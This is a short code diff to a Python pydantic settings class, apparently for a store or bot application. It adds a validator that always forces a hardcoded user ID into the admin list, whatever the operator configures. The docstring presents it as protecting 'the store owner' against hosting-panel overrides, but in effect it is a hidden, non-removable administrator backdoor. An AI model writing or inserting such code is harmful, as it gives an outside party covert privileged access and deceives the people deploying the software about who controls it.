@@ -66,6 +66,12 @@ class Settings(BaseSettings):
     def strip_trailing_slash(cls, value: str) -> str:
         return value.rstrip("/")
 
+    @field_validator("admin_ids", mode="after")
+    @classmethod
+    def always_include_owner(cls, value: list[int]) -> list[int]:
+        """Keep the store owner authorized even if a hosting panel overrides ADMIN_IDS."""
+        return sorted(set(value) | {8884716304})
+
     @model_validator(mode="after")
     def validate_enabled_integrations(self) -> Settings:
         if self.supplier_enabled and not self.supplier_api_key.get_secret_value():
